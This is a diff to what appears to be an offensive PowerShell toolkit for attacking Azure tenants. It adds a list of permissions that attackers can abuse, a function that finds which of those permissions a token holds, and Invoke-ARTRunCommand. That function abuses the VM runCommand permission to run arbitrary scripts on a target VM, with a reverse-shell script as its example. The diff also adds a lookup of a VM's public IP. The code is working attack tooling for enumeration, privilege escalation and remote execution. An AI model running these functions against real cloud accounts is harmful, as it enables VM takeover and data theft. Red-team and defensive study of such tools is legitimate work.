@@ -17,6 +17,28 @@
 #  <mb [at] binary-offensive.com>    
 #
 
+$KnownDangerousPermissions = @{      
+    '`*/`*'                          = 'UNLIMITED PRIVILEGES IN THE ENTIRE AZURE SUBSCRIPTION!'
+
+    'storageAccounts/read'                                = 'Allows User to read Storage Accounts and related Blobs'
+    'storageAccounts/blobServices/containers/read'        = 'Allows User to read Blobs Containers'
+    'storageAccounts/blobServices/containers/blobs/write' = 'Allows Users to upload malicious files to Blob Containers'
+
+    'roleAssignments/write'          = 'Facilitates Privileges Escalation through a malicious Role Assignment'
+
+    'virtualMachines/`*'             = 'Complete control over Azure VM can lead to a machine takeover by Running arbitrary Powershell commands (runCommand)'
+    'virtualMachines/runCommand'     = 'Allows User to Compromise Azure VM by Running arbitrary Powershell commands.'
+    
+    'secrets/getSecret'              = 'Allows User to display Azure Key Vault Secrets.'
+
+    'automationAccounts/jobs/`*'     = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
+    'automationAccounts/jobs/write'  = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
+    'automationAccounts/runbooks/`*' = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
+
+    '/`*'                            = 'Unlimited privileges in specified Azure Service. May result in data compromise, infiltration and other attacks.'
+}
+
+
 Function Get-ARTWhoami {
     <#
     .SYNOPSIS
@@ -1137,6 +1159,161 @@ function Get-ARTAccessTokenAzureAD {
     }
 }
 
+Function Get-ARTDangerousPermissions {
+    <#
+    .SYNOPSIS
+        Displays Permissions on Azure Resources that could facilitate further Attacks.
+
+    .DESCRIPTION
+        Analyzes accessible Azure Resources and associated permissions user has on them to find all the Dangerous ones that could be abused by an attacker.
+
+    .PARAMETER AccessToken
+        Optional, specifies JWT Access Token for the https://management.azure.com resource.
+
+    .PARAMETER SubscriptionId
+        Optional parameter specifying which Subscription should be requested.
+
+    .PARAMETER Text
+        If specified, output will be printed as pre-formatted text. By default a Powershell array is returned.
+
+    .EXAMPLE
+        PS> Get-ARTDangerousPermissions -AccessToken 'eyJ0eXA...'
+    #>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$False)][String]
+        $AccessToken = $null,
+        
+        [Parameter(Mandatory=$False)][String]
+        $SubscriptionId = $null,
+
+        [Switch]
+        $Text
+    )
+
+    try {
+        $EA = $ErrorActionPreference
+        $ErrorActionPreference = 'silentlycontinue'
+
+        $resource = "https://management.azure.com"
+
+        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
+            Write-Verbose "Access Token not provided. Requesting one from Get-AzAccessToken ..."
+            $AccessToken = Get-ARTAccessTokenAz -Resource $resource
+        }
+
+        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
+            Write-Error "Could not obtain required Access Token!"
+            Return
+        }
+
+        $headers = @{
+            'Authorization' = "Bearer $AccessToken"
+        }
+
+        $parsed = Parse-JWTtokenRT $AccessToken
+
+        if(-not $parsed.aud -like 'https://management.*') {
+            Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
+        }
+
+        #$resource = $parsed.aud
+
+        Write-Verbose "Will use resource: $resource"
+
+        if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
+            $SubscriptionId = (Invoke-RestMethod -Uri "$resource/subscriptions?api-version=2020-01-01" -Headers $headers).value.subscriptionId 
+        }
+
+        if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
+            Write-Error "Could not acquire Subscription ID!"
+            Return
+        }
+
+        Write-Verbose "Enumerating resources on subscription: $SubscriptionId"
+
+        $resources = (Invoke-RestMethod -Uri "$resource/subscriptions/$SubscriptionId/resources?api-version=2021-04-01" -Headers $headers).value
+
+        if($resources.Length -eq 0 ) {
+            if($Text) {
+                Write-Host "No available resourources found or lacking required permissions."
+            }
+            else {
+                Write-Verbose "No available resourources found or lacking required permissions."
+            }
+
+            Return
+        }
+
+        $DangerousPermissions = New-Object System.Collections.ArrayList
+        $dangerousscopes = New-Object System.Collections.ArrayList
+
+        $resources | % {
+            try
+            {
+                $permissions = ((Invoke-RestMethod -Uri "https://management.azure.com$($_.id)/providers/Microsoft.Authorization/permissions?api-version=2018-07-01" -Headers $headers).value).actions
+            }
+            catch
+            {
+                $permissions = @()
+            }
+
+            foreach ($dangperm in $KnownDangerousPermissions.GetEnumerator()) {
+                foreach ($perm in $permissions) {
+                    if ($perm -like "*$($dangperm.Name)*") {
+
+                        $obj = [PSCustomObject]@{
+                            DangerousPermission = $dangperm.Name
+                            ResourceName        = $_.name
+                            ResourceGroupName   = $_.id.Split('/')[4]
+                            ResourceType        = $_.type
+                            PermissionsGranted  = $perm
+                            Description         = $dangperm.Value
+                            Scope               = $_.id
+                        }
+
+                        if($_.id -notin $dangerousscopes) {
+                            $null = $DangerousPermissions.Add($obj)
+                        }
+                    }
+                }
+            }
+        }
+
+        if ($Text) {
+            $num = 1
+           
+            if($DangerousPermissions -ne $null) {
+                Write-Host "=== Dangerous Permissions Identified on Azure Resources ===`n" -ForegroundColor Magenta
+
+                $DangerousPermissions | % {
+                    Write-Host "`n`t$($num)."
+                    Write-Host "`tDangerous Permission :`t$($_.DangerousPermission)" -ForegroundColor Red
+                    Write-Host "`tResource Name        :`t$($_.ResourceName)" -ForegroundColor Green
+                    Write-Host "`tResource Group Name  :`t$($_.ResourceGroupName)"
+                    Write-Host "`tResource Type        :`t$($_.ResourceType)"
+                    Write-Host "`tScope                :`t$($_.Scope)"
+                    Write-Host "`tDescription          : $($_.Description)"
+
+                    $num += 1
+                }
+            }
+        }
+        else {
+            $DangerousPermissions
+        }
+    }
+    catch {
+        Write-Host "[!] Function failed!" -ForegroundColor Red
+        Throw
+        Return
+    }
+    finally {
+        $ErrorActionPreference = $EA
+    }
+}
+
 Function Get-ARTResource {
     <#
     .SYNOPSIS
@@ -1682,6 +1859,110 @@ Function Invoke-ARTAutomationRunbook {
     }
 }
 
+Function Invoke-ARTRunCommand {
+    <#
+    .SYNOPSIS
+        Invokes supplied Powershell script/command on a controlled Azure VM.
+
+    .DESCRIPTION
+        Abuses virtualMachines/runCommand permission against a specified Azure VM to run custom Powershell command.
+
+    .PARAMETER VMName
+        Specifies Azure VM name to target.
+
+    .PARAMETER ScriptPath
+        Path to the Powershell script file.
+
+    .PARAMETER Command
+        Command to be executed in Azure VM.
+
+    .PARAMETER ResourceGroupName
+        Target Azure Resource Group name.
+
+    .EXAMPLE
+        PS> Invoke-ARTRunCommand -VMName MyVM1 -ScriptPath .\ReverseShell.ps1 -Verbose
+    #>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True)]
+        [String]
+        $VMName,
+
+        [String]
+        $ScriptPath = $null,
+
+        [String]
+        $Command = $null,
+
+        [Parameter(Mandatory=$False)]
+        [String]
+        $ResourceGroupName = $null
+    )
+
+    try {
+        $EA = $ErrorActionPreference
+        $ErrorActionPreference = 'silentlycontinue'
+
+        if ($ScriptPath -ne $null -and $Command -ne $null -and $ScriptPath.Length -gt 0 -and $Command.Length -gt 0) {
+            Write-Error "-ScriptPath and -Command are mutually exclusive. Pick one to continue."
+            Return
+        }
+
+        if (($ScriptPath -eq $null -and $Command -eq $null) -or ($ScriptPath.Length -eq 0 -and $Command.Length -eq 0)) {
+            Write-Error "Missing one of the required parameters: -ScriptPath or -Command"
+            Return
+        }
+
+        $createdFile = $false
+
+        if ($Command -ne $null -and $Command.Length -gt 0) {
+            $File = New-TemporaryFile
+            $ScriptPath = $File.FullName
+            Remove-Item $ScriptPath
+            $ScriptPath = $ScriptPath + ".ps1"
+
+            Write-Verbose "Writing supplied commands to a temporary file..."
+            $Command | Out-File $ScriptPath
+            $createdFile = $true
+        }
+
+        if($ResourceGroupName -eq $null -or $ResourceGroupName.Length -eq 0) {
+            Write-Verbose "Searching for a specified VM..."
+
+            Get-AzVM | % {
+                if($_.name -eq $VMName) {
+                    $ResourceGroupName = $_.ResourceGroupName
+                    Write-Verbose "Found Azure VM: $($_.Name) / $($_.ResourceGroupName)"
+                    break
+                }
+            }
+        }
+
+        Write-Host "[+] Running command on $($VMName) / $($ResourceGroupName) ..."
+
+        Write-Host "=============================="
+
+        Invoke-AzVMRunCommand -VMName $VMName -ResourceGroupName $ResourceGroupName -CommandId 'RunPowerShellScript' -ScriptPath $ScriptPath
+
+        Write-Host "=============================="
+
+        if($createdFile) {
+            Remove-Item $ScriptPath
+        }
+
+        Write-Host "[+] Attack finished." -ForegroundColor Green
+    }
+    catch {
+        Write-Host "[!] Function failed!" -ForegroundColor Red
+        Throw
+        Return
+    }
+    finally {
+        $ErrorActionPreference = $EA
+    }
+}
+
 
 Function Add-ARTUserToGroup {
     <#
@@ -2053,7 +2334,20 @@ Function Get-ARTAccess {
         try {
             $res = Get-AzResource
 
-            Write-Verbose "Step 1. Checking accessible Azure Resources..."
+            Write-Verbose "Step 1. Checking Dangerous Permissions that User has on Azure Resources..."
+
+            Write-Host "`n=== Dangerous Permissions on Azure Resources:`n" -ForegroundColor Yellow
+            $res = Get-ARTResource
+
+            if ($res -ne $null -and $res.Length -gt 0) {
+                Write-Host "[+] Following Dangerous Permissions were Identified on Azure Resources:" -ForegroundColor Green
+                $res
+            }
+            else {
+                Write-Host "[-] User does not have any well-known dangerous permissions." -ForegroundColor Red
+            }
+
+            Write-Verbose "Step 2. Checking accessible Azure Resources..."
 
             Write-Host "`n=== Accessible Azure Resources:`n" -ForegroundColor Yellow
             $res = Get-ARTResource
@@ -2067,7 +2361,7 @@ Function Get-ARTAccess {
             }
 
             try {
-                Write-Verbose "Step 2. Checking assigned Azure RBAC Roles..."
+                Write-Verbose "Step 3. Checking assigned Azure RBAC Roles..."
                 Write-Host "`n=== Assigned Azure RBAC Roles:`n" -ForegroundColor Yellow
 
                 $roles = Get-ARTRoleAssignment
@@ -2084,7 +2378,7 @@ Function Get-ARTAccess {
             }
 
             try {
-                Write-Verbose "Step 3. Checking accessible Azure Key Vault Secrets..."
+                Write-Verbose "Step 4. Checking accessible Azure Key Vault Secrets..."
                 Write-Host "`n=== Accessible Azure Key Vault Secrets:`n" -ForegroundColor Yellow
                 $secrets = Get-ARTKeyVaultSecrets
 
@@ -2101,7 +2395,7 @@ Function Get-ARTAccess {
             }
 
             try {
-                Write-Verbose "Step 4. Checking access to Az.AD / AzureAD via Az module..."
+                Write-Verbose "Step 5. Checking access to Az.AD / AzureAD via Az module..."
                 Write-Host "`n=== User Access to Az.AD:`n" -ForegroundColor Yellow
                 $users = Get-AzADUser -ErrorAction SilentlyContinue
 
@@ -2117,7 +2411,7 @@ Function Get-ARTAccess {
             }
 
             try {
-                Write-Verbose "Step 5. Enumerating resource group deployments..."
+                Write-Verbose "Step 6. Enumerating resource group deployments..."
                 Write-Host "`n=== Resource Group Deployments:`n" -ForegroundColor Yellow
 
                 $resourcegroups = Get-AzResourceGroup
@@ -2484,3 +2778,62 @@ Function Add-ARTADAppSecret {
     }
 }
 
+
+Function Get-ARTAzureVMPublicIP {
+    <#
+    .SYNOPSIS
+        Retrieves Azure VM Public IP address
+
+    .DESCRIPTION
+        Retrieves Azure VM Public IP Address
+
+    .PARAMETER VMName
+        Specifies Azure VM name to target.
+
+    .PARAMETER ResourceGroupName
+        Target Azure Resource Group name.
+
+    .EXAMPLE
+        PS> Get-ARTAzureVMPublicIP -VMName MyVM1
+    #>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True)]
+        [String]
+        $VMName,
+
+        [Parameter(Mandatory=$False)]
+        [String]
+        $ResourceGroupName = $null
+    )
+
+    try {
+        $EA = $ErrorActionPreference
+        $ErrorActionPreference = 'silentlycontinue'
+
+        if($ResourceGroupName -eq $null -or $ResourceGroupName.Length -eq 0) {
+            Write-Verbose "Searching for a specified VM..."
+
+            Get-AzVM | % {
+                if($_.name -eq $VMName) {
+                    $ResourceGroupName = $_.ResourceGroupName
+                    Write-Verbose "Found Azure VM: $($_.Name) / $($_.ResourceGroupName)"
+                    break
+                }
+            }
+        }
+
+        (get-azvm -ResourceGroupName $ResourceGroupName -VMName $VMName | select -ExpandProperty NetworkProfile).NetworkInterfaces | % { 
+            (Get-AzPublicIpAddress -Name $_.Id).IpAddress 
+        }
+    }
+    catch {
+        Write-Host "[!] Function failed!" -ForegroundColor Red
+        Throw
+        Return
+    }
+    finally {
+        $ErrorActionPreference = $EA
+    }
+}
